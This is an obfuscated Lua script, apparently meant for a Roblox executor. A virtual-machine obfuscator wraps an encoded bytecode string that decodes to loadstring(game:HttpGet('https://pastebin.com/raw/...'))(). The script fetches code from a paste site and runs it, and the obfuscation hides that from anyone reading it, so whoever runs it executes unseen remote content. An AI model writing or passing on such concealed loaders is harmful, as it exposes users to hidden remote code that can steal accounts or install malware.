local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function() return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...) local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30) if (v1(v30,2)==81) then v19=v0(v3(v30,1,1));return "";else local v83=v2(v0(v30,16));if v19 then local v90=v5(v83,v19);v19=nil;return v90;else return v83;end end end);local function v20(v31,v32,v33) if v33 then local v84=(v31/(2^(v32-1)))%(((2 + 3) -3)^(((v33-(2 -1)) -(v32-(1 -0))) + 1)) ;return v84-(v84%(2 -1)) ;else local v85=(621 -(555 + 64))^(v32-((147 + 785) -(857 + 74))) ;return (((v31%(v85 + v85))>=v85) and (569 -(367 + 201))) or (927 -(214 + 713)) ;end end local function v21() local v34=877 -(282 + 595) ;local v35;while true do if (v34==(1638 -(1523 + 112 + 2))) then return v35;end if (v34==(0 + 0)) then v35=v1(v16,v18,v18);v18=v18 + (4 -3) ;v34=118 -(32 + 85) ;end end end local function v22() local v36,v37=v1(v16,v18,v18 + 2 );v18=v18 + 1 + 1 ;return (v37 * (1213 -(892 + 65))) + v36 ;end local function v23() local v38=0;local v39;local v40;local v41;local v42;while true do if (v38==(2 -1)) then return (v42 * (31011612 -14234396)) + (v41 * 65536) + (v40 * (469 -213)) + v39 ;end if (v38==((258 + 92) -(87 + 263))) then v39,v40,v41,v42=v1(v16,v18,v18 + (183 -(67 + 113)) );v18=v18 + 3 + (3 -2) ;v38=2 -1 ;end end end local function v24() local v43=952 -((1857 -(87 + 968)) + 150) ;local v44;local v45;local v46;local v47;local v48;local v49;while true do if (v43==((773 -(745 + 21)) -4)) then if (v48==((0 + 0) -0)) then if (v47==(0 + 0)) then return v49 * (997 -(915 + 82)) ;else v48=2 -1 ;v46=0 + 0 ;end elseif (v48==(1677 + 370)) then return ((v47==(0 + 0)) and (v49 * ((1 -0)/(1187 -((2941 -1872) + (519 -401)))))) or (v49 * NaN) ;end return v8(v49,v48-(4258 -(2936 + 299)) ) * (v46 + (v47/((4 -2)^52))) ;end if (v43==(3 -2)) then v46=3 -2 ;v47=(v20(v45,1 -0 ,4 + (36 -20) ) * ((3 -1)^(32 + 0))) + v44 ;v43=887 -((1023 -762) + 624) ;end if ((791 -(368 + 423))==v43) then v44=v23();v45=v23();v43=1081 -(1020 + 1 + 59) ;end if ((6 -4)==v43) then v48=v20(v45,(31 + 8) -(10 + 8) ,146 -115 );v49=((v20(v45,122 -90 )==(443 -(416 + 26))) and  -(3 -2)) or (1 + 0) ;v43=4 -1 ;end end end local function v25(v50) local v51;if  not v50 then v50=v23();if (v50==(0 -0)) then return "";end end v51=v3(v16,v18,(v18 + v50) -(1 -0) );v18=v18 + v50 ;local v52={};for v67=1818 -(1703 + 114) , #v51 do v52[v67]=v2(v1(v3(v51,v67,v67)));end return v6(v52);end local v26=v23;local function v27(...) return {...},v12("#",...);end local function v28() local v53=(function() return 0;end)();local v54=(function() return;end)();local v55=(function() return;end)();local v56=(function() return;end)();local v57=(function() return;end)();local v58=(function() return;end)();local v59=(function() return;end)();local v60=(function() return;end)();while true do if ((1 -0)~=v53) then else local v88=(function() return 0;end)();while true do if (1==v88) then v60=(function() return {};end)();for v109= #",",v59 do local v110=(function() return 0;end)();local v111=(function() return;end)();local v112=(function() return;end)();while true do if (v110~=1) then else if (v111== #"<") then v112=(function() return v21()~=0 ;end)();elseif (v111==2) then v112=(function() return v24();end)();elseif (v111== #"gha") then v112=(function() return v25();end)();end v60[v109]=(function() return v112;end)();break;end if (v110==(0 -0)) then local v115=(function() return 0;end)();local v116=(function() return;end)();while true do if (v115==(285 -(134 + 151))) then v116=(function() return 0;end)();while true do if (1==v116) then v110=(function() return 1;end)();break;end if ((1665 -(970 + 695))==v116) then local v160=(function() return 0 -0 ;end)();while true do if (v160==(1991 -(582 + 1408))) then v116=(function() return 1;end)();break;end if (v160==(0 -0)) then v111=(function() return v21();end)();v112=(function() return nil;end)();v160=(function() return 1 -0 ;end)();end end end end break;end end end end end v88=(function() return 7 -5 ;end)();end if (v88==(1826 -(1195 + 629))) then v53=(function() return 2 -0 ;end)();break;end if (v88==0) then v58=(function() return {v55,v56,nil,v57};end)();v59=(function() return v23();end)();v88=(function() return 1;end)();end end end if (v53==0) then v54=(function() return function(v98,v99,v100) local v101=(function() return 241 -(187 + 54) ;end)();local v102=(function() return;end)();while true do if (0~=v101) then else v102=(function() return 0;end)();while true do if ((780 -(162 + 618))==v102) then local v117=(function() return 0;end)();local v118=(function() return;end)();while true do if (v117==0) then v118=(function() return 0 + 0 ;end)();while true do if (v118~=(0 + 0)) then else local v167=(function() return 0 -0 ;end)();while true do if (v167~=(0 -0)) then else v98[v99-#" " ]=(function() return v100();end)();return v98,v99,v100;end end end end break;end end end end break;end end end;end)();v55=(function() return {};end)();v56=(function() return {};end)();v57=(function() return {};end)();v53=(function() return 1 + 0 ;end)();end if (2==v53) then v58[ #"nil"]=(function() return v21();end)();for v91= #">",v23() do local v92=(function() return v21();end)();if (v20(v92, #":", #".")~=(1636 -(1373 + 263))) then else local v105=(function() return 1000 -(451 + 549) ;end)();local v106=(function() return;end)();local v107=(function() return;end)();local v108=(function() return;end)();while true do if (v105~=1) then else v108=(function() return {v22(),v22(),nil,nil};end)();if (v106==(0 -0)) then local v119=(function() return 0;end)();local v120=(function() return;end)();while true do if (v119==(0 -0)) then v120=(function() return 0;end)();while true do if (0~=v120) then else v108[ #"-19"]=(function() return v22();end)();v108[ #".com"]=(function() return v22();end)();break;end end break;end end elseif (v106== #"[") then v108[ #"xnx"]=(function() return v23();end)();elseif (v106==(1386 -(746 + 638))) then v108[ #"gha"]=(function() return v23() -((1 + 1)^16) ;end)();elseif (v106== #"gha") then local v170=(function() return 0;end)();local v171=(function() return;end)();while true do if (v170~=0) then else v171=(function() return 0 -0 ;end)();while true do if (v171==0) then v108[ #"xnx"]=(function() return v23() -(2^(357 -(218 + 123))) ;end)();v108[ #"0313"]=(function() return v22();end)();break;end end break;end end end v105=(function() return 2;end)();end if (v105==2) then if (v20(v107, #",", #".")~= #".") then else v108[2]=(function() return v60[v108[2]];end)();end if (v20(v107,2,1583 -(1535 + 46) )== #":") then v108[ #"91("]=(function() return v60[v108[ #"nil"]];end)();end v105=(function() return 3;end)();end if ((3 + 0)~=v105) then else if (v20(v107, #"-19", #"-19")== #"\\") then v108[ #"asd1"]=(function() return v60[v108[ #"0836"]];end)();end v55[v91]=(function() return v108;end)();break;end if (v105==(0 + 0)) then v106=(function() return v20(v92,562 -(306 + 254) , #"gha");end)();v107=(function() return v20(v92, #"http",6);end)();v105=(function() return 1;end)();end end end end for v93= #"|",v23() do v56,v93,v28=(function() return v54(v56,v93,v28);end)();end return v58;end end end local function v29(v61,v62,v63) local v64=v61[(581 -(361 + 219)) + 0 ];local v65=v61[3 -1 ];local v66=v61[3];return function(...) local v69=v64;local v70=v65;local v71=v66;local v72=v27;local v73=321 -(53 + 267) ;local v74= -1;local v75={};local v76={...};local v77=v12("#",...) -((983 -(18 + 964)) + 0) ;local v78={};local v79={};for v86=0 -0 ,v77 do if (v86>=v71) then v75[v86-v71 ]=v76[v86 + ((2273 -1669) -(268 + 335)) ];else v79[v86]=v76[v86 + (291 -(60 + 230)) ];end end local v80=(v77-v71) + (573 -(426 + 146)) ;local v81;local v82;while true do local v87=0;while true do if (v87==(0 + 0)) then v81=v69[v73];v82=v81[1457 -(164 + 118 + 1174) ];v87=1;end if ((1==v87) or (1417>3629)) then if (v82<=((516 + 302) -(569 + (1092 -(20 + 830))))) then if (v82<=(8 -5)) then if ((4795>402) and (v82<=(1 + 0))) then if ((4813>3565) and (v82>(1024 -(706 + 318)))) then local v125=v81[1253 -(721 + 530) ];local v126=v79[v81[1274 -(945 + 326) ]];v79[v125 + (2 -1) ]=v126;v79[v125]=v126[v81[4 + 0 ]];else local v130=v81[702 -(271 + 429) ];v79[v130]=v79[v130](v13(v79,v130 + 1 + 0 ,v74));end elseif ((3912==3912) and (v82>(1502 -(1408 + 92)))) then v79[v81[2]]={};else v79[v81[1088 -(461 + 625) ]]();end elseif (v82<=(1293 -(993 + 295))) then if ((2821<=4824) and (v82>(1 + 0 + 3))) then v79[v81[1173 -(418 + 753) ]]={};else do return;end end elseif (v82>(3 + 3)) then local v134=0 + 0 ;local v135;local v136;while true do if (v134==(0 + 0)) then v135=v81[1 + 1 ];v136=v79[v81[532 -(406 + 123) ]];v134=1770 -(1749 + 20) ;end if (v134==(1 + 0)) then v79[v135 + ((1449 -(116 + 10)) -(1249 + 73)) ]=v136;v79[v135]=v136[v81[4]];break;end end else local v137=v81[2];v79[v137]=v79[v137](v13(v79,v137 + 1 + 0 + 0 ,v74));end elseif ((1738<=2195) and (v82<=(1156 -(466 + 679)))) then if ((41<=3018) and (v82<=9)) then if (v82>(19 -11)) then do return;end else v79[v81[5 -3 ]]=v81[1903 -(106 + 1794) ];end elseif ((2145<=4104) and (v82==10)) then v79[v81[2]]=v63[v81[1 + 2 ]];else v79[v81[1 + 1 ]]=v81[8 -5 ];end elseif ((2689<4845) and (v82<=(751 -(542 + 196)))) then if ((v82==(32 -20)) or (2322>2622)) then local v145=114 -((8 -4) + 110) ;local v146;local v147;local v148;local v149;while true do if ((v145==(585 -(57 + 527))) or (4534==2082)) then v74=(v148 + v146) -(1428 -(41 + 1386)) ;v149=103 -(17 + 86) ;v145=2 + 0 ;end if (v145==(3 -1)) then for v172=v146,v74 do local v173=0 -0 ;while true do if (v173==0) then v149=v149 + (167 -(122 + 44)) ;v79[v172]=v147[v149];break;end end end break;end if (v145==(0 -0)) then v146=v81[6 -(2 + 2) ];v147,v148=v72(v79[v146](v13(v79,v146 + 1 + 0 ,v81[1 + 2 ])));v145=1 + 0 ;end end else local v150=v81[3 -1 ];local v151,v152=v72(v79[v150](v13(v79,v150 + (66 -(30 + 35)) ,v81[3])));v74=(v152 + v150) -(1 + 0) ;local v153=(0 -0) + 0 ;for v156=v150,v74 do v153=v153 + 1 ;v79[v156]=v151[v153];end end elseif (v82>14) then v79[v81[1259 -(1043 + 214) ]]=v63[v81[11 -8 ]];else v79[v81[1214 -(323 + 889) ]]();end v73=v73 + (2 -1) ;break;end end end end;end return v29(v28(),{},v17)(...);end return v15("LOL!043Q00030A3Q006C6F6164737472696E6703043Q0067616D6503073Q00482Q747047657403213Q00682Q7470733A2Q2F706173746562696E2E636F6D2F7261772F507941467561705600094Q00057Q00120F000100013Q00120F000200023Q002007000200020003001208000400044Q000D000200044Q000600013Q00022Q00020001000100012Q00093Q00017Q00",v9(),...);
